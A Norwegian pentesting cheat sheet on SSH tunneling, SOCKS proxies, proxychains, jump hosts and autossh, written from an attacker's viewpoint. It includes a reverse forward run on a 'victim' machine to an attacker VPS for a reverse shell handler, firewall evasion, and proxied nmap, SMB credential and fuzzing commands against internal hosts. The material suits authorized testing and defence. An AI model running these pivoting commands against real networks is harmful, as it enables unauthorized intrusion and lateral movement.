<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🚇 SSH Tunneling & Proxychains - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗███████╗██╗  ██╗    ████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗██╗     
  ██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝██║     
  ███████╗███████╗███████║       ██║   ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
  ╚════██║╚════██║██╔══██║       ██║   ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
  ███████║███████║██║  ██║       ██║   ╚██████╔╝██║ ╚████║██║ ╚████║███████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
       Pivoting, Port Forwarding (-L, -R, -D) & Proxychains Integration
```
<p align="center">
  <img src="https://img.shields.io/badge/SSH-Tunneling_&_Pivoting-blue?style=for-the-badge" alt="SSH Tunneling">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunnels-green?style=for-the-badge" alt="Pivoting">
  <img src="https://img.shields.io/badge/Integration-Proxychains--ng-orange?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Protocol-SSH_SOCKS5-purple?style=for-the-badge" alt="SOCKS5">
</p>

<p align="center">
  <b>🚇 Omfattende referanse for Local (-L), Remote/Reverse (-R) og Dynamic SOCKS (-D) SSH-tunneler med Proxychains-ng-integrasjon</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Oversikt og tunneleringsarkitekturer](#-oversikt--tunneleringsarkitekturer)
- [Lokal portvideresending (`-L`)](#-local-port-videresending--l)
  - [Syntaks og mekanikk](#syntaks--mekanikk)
  - [Forwarding an Internal Web Interface](#forwarding-an-internal-web-interface)
  - [Forwarding Remote Database Ports](#videresending-remote-database-ports)
- [Remote / Reverse Port Forwarding (`-R`)](#-remote--reverse-port-videresending--r)
  - [Syntaks og mekanikk](#syntaks--mekanikk-1)
  - [Exposing Local Reverse Shell Handler](#exposing-local-reverse-shell-handler)
  - [Relaying Inbound Traffic from DMZ](#relaying-inbound-traffic-from-dmz)
- [Dynamic SOCKS Forwarding (`-D`)](#-dynamic-socks-forwarding--d)
  - [Syntax & SOCKS5-oppsett](#syntax--socks5-setup)
- [Proxychains-ng-konfigurasjon](#-proxychains-ng-configuration)
  - [Konfigurerer `/etc/proxychains4.conf`](#configuring-etcproxychains4conf)
  - [Routing CLI Tools through Proxychains](#routing-cli-tools-through-proxychains)
- [Multi-Hop Pivoting & Jump Hosts (`-J`)](#-multi-hop-pivoting--jump-hosts--j)
- [Persistent Tunnels with Autossh](#-persistent-tunnels-with-autossh)
- [Interactive SSH Escape Sequences (`~C`)](#-interactive-ssh-escape-sequences-c)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)

---

## 🎯 Oversikt og tunnelarkitekturer

SSH er ikke bare en ekstern terminalklient; det er et kryptert, toveis bytestrømtransportlag som omgår restriktive retningslinjer for egress/ingress brannmur:

1. **Lokal portvideresending (`-L`):** Åpner en lytteport på **angriperens lokale maskin**; tilkoblinger tunneleres gjennom SSH og videresendes til en destinasjon som kan nås fra den eksterne SSH-serveren.
2. **Ekstern portvideresending (`-R`):** Åpner en lytteport på **ekstern SSH-server**; innkommende tilkoblinger tunneleres tilbake til angriperens lokale maskin eller interne mål.
3. **Dynamisk portvideresending (`-D`):** Gjør SSH-klienten til en lokal **SOCKS4/SOCKS5-proxy**, som lar verktøy (Nmap, Burp Suite, Ffuf, Metasploit) rute vilkårlig TCP-trafikk over det eksterne nettverket.
```
Attacker [Kali]                  SSH Bastion / Pivot               Internal Target
 192.168.1.50   =========>       10.10.10.200 (Dual NIC)  ------>  172.16.0.15:80
   (Local)                       (SSH Server)                      (Isolated Host)
```
---

## 🔌 Lokal portvideresending (`-L`)

### Syntaks og mekanikk
```
ssh -L [bind_address:]<local_port>:<destination_host>:<destination_port> user@bastion
```
### Videresende et internt webgrensesnitt
Få tilgang til et nettadministrasjonspanel på `172.16.0.15:80` gjennom pivot `10.10.10.200`:
```bash
ssh -N -L 8080:172.16.0.15:80 user@10.10.10.200
```
*Bla nå til `http://127.0.0.1:8080` i din lokale nettleser.*

### Videresending av eksterne databaseporter
Få tilgang til en intern PostgreSQL-database bare bundet til `127.0.0.1:5432` på den eksterne serveren:
```bash
ssh -N -L 5432:127.0.0.1:5432 ubuntu@target-server.com
```
> [!MERK]
> Flagg brukt:
> - `-N`: Ikke utfør en ekstern skallkommando (kun tunnel).
> - `-f`: Kjør i bakgrunnen rett før kommandoutførelse.

---

## 🔄 Remote / Reverse Port Forwarding (`-R`)

### Syntaks og mekanikk
```
ssh -R [bind_address:]<remote_port>:<local_host>:<local_port> user@attacker_vps
```
### Eksponering av lokal omvendt skallbehandler
Fra en kompromittert målmaskin bak NAT, slå gjennom utgående brannmurer for å sende trafikk til den eksterne lytteren din på VPS:
```bash
# Executed on victim / pivot machine
ssh -N -R 4444:127.0.0.1:4444 attacker@vps.domain.com
```
### Videresending av innkommende trafikk fra DMZ
Videresend port 8080 på den eksterne pivoten til lokal port 80:
```bash
ssh -N -R 8080:127.0.0.1:80 user@pivot.corp.local
```
> [!VIKTIG]
> For å binde eksterne porter til alle grensesnitt (`0.0.0.0`), må SSH-serverens `/etc/ssh/sshd_config` angi:
> `GatewayPorts yes` eller `GatewayPorts clientspecified`.

---

## 🌐 Dynamisk SOCKS-videresending (`-D`)

### Syntaks og SOCKS5-oppsett
Opprett en dynamisk SOCKS5-proxy på lokal port `1080`:
```bash
ssh -N -D 127.0.0.1:1080 user@pivot.corp.local
```
Bekreft at SOCKS-proxyen lytter:
```bash
ss -tlpn | grep 1080
```
---

## ⚙️ Proxychains-ng-konfigurasjon

Proxychains fanger opp dynamiske biblioteknettverksanrop (`connect()`, `gethostbyname()`) via `LD_PRELOAD` for å tvinge standard CLI-applikasjoner gjennom SOCKS/HTTP-proxyer.

### Konfigurere `/etc/proxychains4.conf`
Rediger konfigurasjonsfilen slik at den peker til SSH Dynamic SOCKS-tunnelen:
```ini
# Enable dynamic chain or strict chain
strict_chain

# Proxy DNS requests through proxy (prevents DNS leaks)
proxy_dns

[ProxyList]
# protocol  ip          port
socks5      127.0.0.1   1080
```
### Ruting av CLI-verktøy gjennom proxy-kjeder
```bash
# Nmap TCP Connect Scan (Note: SYN scans do NOT work through SOCKS proxies)
proxychains4 nmap -sT -Pn -sV 172.16.0.0/24 -p 22,80,445,3389

# Executing CrackMapExec / NetExec across internal subnet
proxychains4 nxc smb 172.16.0.100 -u 'Administrator' -p 'P@ssw0rd'

# Web fuzzing internal server
proxychains4 ffuf -u http://172.16.0.15/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
---

## 🔀 Multi-Hop Pivoting & Jump Hosts (`-J`)

Når du krysser flere segmenterte brannmurgrenser:
```bash
# Jump through Bastion 1, then Bastion 2, to reach Target
ssh -J user@bastion1.corp.com:22,user@bastion2.corp.internal target-user@internal-db.corp.internal

# Dynamic SOCKS over double jump
ssh -J user@bastion1:22,user@bastion2:22 -D 1080 target-user@pivot
```
---

## 🔁 Vedvarende tunneler med Autossh

Når SSH-tunneler faller på grunn av nettverkstidsavbrudd eller NAT faller, overvåker `autossh` automatisk og starter SSH-tilkoblingen på nytt:
```bash
# Install autossh
sudo apt install -y autossh

# Establish background auto-reconnecting SOCKS tunnel
autossh -M 0 -f -N -D 127.0.0.1:1080 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" user@pivot.corp.local
```
---

## ⌨️ Interactive SSH Escape Sequences (`~C`)

Hvis du allerede har en interaktiv SSH-økt åpen og plutselig trenger å åpne en port videre uten å koble fra:

1. Trykk `Enter`
2. Skriv `~C` (Tilde etterfulgt av stor C)
3. Spørsmålet endres til `ssh> `
4. Legg til reglene for videresending umiddelbart:
   ```text
   ssh> -L 8080:192.168.10.50:80
   Forwarding port.
   ```
Eller lag dynamiske SOCKS:
   ```text
   ssh> -D 1080
   ```
---

## ⚡ Hurtigreferansetabell

| Mål | Kommando |
|----------------|--------|
| **Lokal Port Forward** | `ssh -N -L <L_PORT>:<DEST_IP>:<DEST_PORT> user@pivot` |
| **Ekstern port videresending** | `ssh -N -R <R_PORT>:<DEST_IP>:<DEST_PORT> user@vps` |
| **Dynamisk SOCKS5 Proxy**| `ssh -N -D 127.0.0.1:1080 user@pivot` |
| **Stille tunnel i bakgrunnen** | `ssh -f -N -D 1080 user@pivot` |
| **Jump Host Pivot** | `ssh -J user@hop1,user@hop2 target` |
| **Kjør Tool via Proxychains** | `proxychains4 <TOOL> <ARGS>` |
| **Persistent Auto-Reconnect** | `autossh -M 0 -f -N -D 1080 -o "ServerAliveInterval 30" user@pivot` |
| **On-the-fly Tunnel** | `Enter` deretter `~C` -> `ssh> -D 1080` |

---

## 🛡️ Defensive betraktninger og OPSEC

1. **Deaktiver portvideresending i SSHD:** Sett `AllowTcpForwarding no` og `PermitTunnel no` i `/etc/ssh/sshd_config` på herdede produksjonssystemer.
2. **Nettverksflytanomalideteksjon:** Vedvarende langvarige SSH-økter som overfører betydelige toveis bytestrømmer indikerer ofte interaktiv tunnelering eller dataeksfiltrering.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> [!FORSIKTIG]
> SSH-tunnelering og nettverkspivoting må kun utføres på nettverk og systemer hvor det er innhentet eksplisitt skriftlig autorisasjon. Uautorisert omgåelse av brannmurer i perimeternettverket er ulovlig.